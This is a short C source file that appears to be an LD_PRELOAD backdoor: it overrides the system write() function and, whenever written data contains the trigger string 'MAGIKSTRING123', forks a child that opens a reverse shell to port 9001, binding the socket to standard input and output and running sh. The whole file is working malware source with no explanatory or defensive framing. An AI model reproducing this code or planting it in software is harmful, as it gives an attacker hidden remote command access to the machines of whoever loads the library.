#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <stdbool.h>

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int rev_shell(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
		
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("0.0.0.0");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

	
    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}

// lovely syntax right here...
static int (*get_write(void))(int, const void *, size_t)
{
	static int (*real_write) (int fildes, const void *buf, size_t nbyte) = NULL;
	if (!real_write)
		real_write = dlsym(RTLD_NEXT, "write");
	
	return real_write;
}


static void write_to_file(const char *f, const char *s)
{
	int fd = open(f, O_RDWR | O_APPEND | O_CREAT, 0666);

	get_write()(fd, s, strlen(s));
	close(fd);
}


ssize_t write(int fildes, const void *buf, size_t nbyte)
{
	int (*actual_write) (int fildes, const void *buf, size_t nbyte) = get_write();

	static bool already_running = false;

	if (strstr(buf, "MAGIKSTRING123"))
	{
		if (!already_running)
		{
			int pid = fork();
			already_running = true;
			if (!pid)
			{
				rev_shell();
			}
		}
	}
	
	return actual_write(fildes, buf, nbyte);
}
